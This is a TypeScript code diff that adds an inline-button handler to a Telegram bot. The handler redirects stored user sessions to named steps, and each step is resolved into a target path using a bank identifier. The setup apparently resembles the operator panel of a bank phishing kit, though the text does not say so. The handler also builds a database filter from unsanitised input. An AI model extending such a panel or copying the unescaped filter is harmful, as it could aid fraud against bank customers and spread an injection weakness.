@@ -248,6 +248,63 @@ function cmdHelp(ctx: Context) {
   return ctx.reply(text, { parse_mode: "HTML", ...LP });
 }
 
+async function cmdCallbackRedirect(ctx: Context) {
+  const cb = (ctx as any).callbackQuery;
+  if (!cb || !cb.data) return;
+  const parts = String(cb.data).split(":");
+  if (parts.length < 3 || parts[0] !== "redirect") {
+    return ctx.answerCallbackQuery({ text: "⚠️ Geçersiz buton", show_alert: true });
+  }
+  const [, step, idOrPublic] = parts;
+  const stepLower = String(step || "").toLowerCase().trim();
+
+  if (!idOrPublic) return ctx.answerCallbackQuery({ text: "⚠️ Session ID boş", show_alert: true });
+  const priority = getStepPriority(stepLower);
+  if (priority === null) {
+    return ctx.answerCallbackQuery({ text: `⚠️ Geçersiz adım: ${step}`, show_alert: true });
+  }
+
+  const supabase = await createServerSupabaseClient();
+  if (!supabase) return ctx.answerCallbackQuery({ text: "⚠️ Supabase hatası", show_alert: true });
+
+  const { data: sess, error: sErr } = await supabase
+    .from("sessions")
+    .select("id, public_id, current_step, form_data")
+    .or(`id.eq.${idOrPublic},public_id.eq.${idOrPublic}`)
+    .limit(1)
+    .maybeSingle();
+  if (sErr) return ctx.answerCallbackQuery({ text: "⚠️ Hata: " + sErr.message.slice(0, 60), show_alert: true });
+  if (!sess) return ctx.answerCallbackQuery({ text: "⚠️ Session bulunamadı", show_alert: true });
+
+  const { error } = await supabase
+    .from("sessions")
+    .update({ current_step: stepLower as any, is_hidden: false })
+    .eq("id", sess.id);
+  if (error) {
+    return ctx.answerCallbackQuery({ text: "⚠️ Güncelleme hatası: " + error.message.slice(0, 60), show_alert: true });
+  }
+
+  const target = resolveStepTargetPath(
+    stepLower as any,
+    sess.id,
+    sess.public_id || sess.id,
+    (sess.form_data ?? {}) as { bankSlug?: string | null },
+  );
+
+  const label = (STEP_ALIASES.find((a) => a.step === stepLower) || { label: stepLower }).label;
+  const sessShort = String(sess.id).slice(0, 8);
+
+  try {
+    await ctx.answerCallbackQuery({ text: `✅ ${label}: ${sessShort}` });
+  } catch {}
+
+  // Callback ile tıklandığında aynı sohbete sonucu yaz (opsiyonel, teyit amaçlı)
+  try {
+    const text = `🔁 <b>INLINE YÖNLENDİRME</b>\nSession: <code>${escapeTelegramHTML(sessShort)}</code>\nAdım: <b>${escapeTelegramHTML(String(sess.current_step ?? "-"))}</b> → <b>${escapeTelegramHTML(stepLower)}</b> (${escapeTelegramHTML(label)})\nHedef: <code>${escapeTelegramHTML(target.slice(0, 120))}</code>`;
+    await ctx.reply(text, { parse_mode: "HTML", ...LP });
+  } catch {}
+}
+
 function installBotHandlers(bot: Bot): void {
   bot.command(["start", "help"], async (ctx) => cmdHelp(ctx));
   bot.command("test", async (ctx) => {
@@ -264,6 +321,10 @@ function installBotHandlers(bot: Bot): void {
   bot.command("unban", async (ctx) => cmdUnban(ctx, String(ctx.match || "")));
   bot.command("session", async (ctx) => cmdSession(ctx, String(ctx.match || "")));
   bot.command("redirect", async (ctx) => cmdRedirect(ctx, String(ctx.match || "")));
+
+  // ⭐ INLINE BUTON: yonlendirme butonuna tiklayinca
+  bot.callbackQuery(/^redirect:/i, async (ctx) => cmdCallbackRedirect(ctx));
+
   bot.on("message:text", async (ctx) => {
     const txt = ctx.msg.text || "";
     if (txt.startsWith("/")) {
